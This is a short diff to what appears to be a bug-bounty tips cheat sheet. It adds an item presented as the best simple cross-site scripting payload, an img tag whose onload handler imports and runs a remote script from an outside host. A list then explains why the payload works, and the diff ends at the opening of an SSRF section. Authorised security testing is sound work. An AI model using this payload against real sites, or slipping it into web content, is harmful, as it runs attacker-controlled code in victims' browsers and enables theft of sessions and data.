@@ -40,6 +40,17 @@ reportError(name , enerror=eval)
 ```
 ![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Whitespace%20Separators.jpeg)
 
+7-
+The Best Simple #XSS Payload
+
+`<Img Src=//X55.is OnLoad=import(src)>`
+
+Reasons:
+
+1. It loads a remote script 
+2. It pops in SOURCE and DOM
+3. It allows custom code in URL hash
+   
 # SSRF
 1-Try other URL schemes:<br>
 ```
